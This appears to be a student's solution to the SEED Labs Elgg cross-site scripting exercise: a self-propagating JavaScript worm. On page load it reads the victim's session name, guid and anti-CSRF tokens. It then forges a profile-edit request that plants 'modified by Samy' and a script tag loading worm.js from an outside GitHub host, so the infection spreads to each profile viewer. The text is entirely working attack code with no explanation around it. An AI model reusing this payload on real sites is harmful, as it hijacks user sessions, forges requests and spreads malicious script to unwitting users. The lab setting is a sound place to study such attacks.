  window.onload = function () {
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
     var worm = encodeURIComponent(
        '<script type="text/javascript"' +
        'src="https://github.com/Sravyak94/XSS/blob/main/worm.js">' +
        "</" +
        "script>"
    );
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var description =
      "&description=<p>modified by Samy<p>" + worm + "&accesslevel[description]=2";

    var samyGuid = 59;
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    var content = userName + guid + ts + token + description;
    
    if (elgg.session.user.guid != samyGuid) {
      //Create and send Ajax request to modify profile
      var Ajax = null;
      Ajax = new XMLHttpRequest();
      Ajax.open("POST", sendurl, true);
      Ajax.setRequestHeader("Host", "wwww.seed-server.com");
      Ajax.setRequestHeader(
        "Content-Type",
        "application/x-www-form-urlencoded"
      );
      Ajax.send(content);
    }
  };
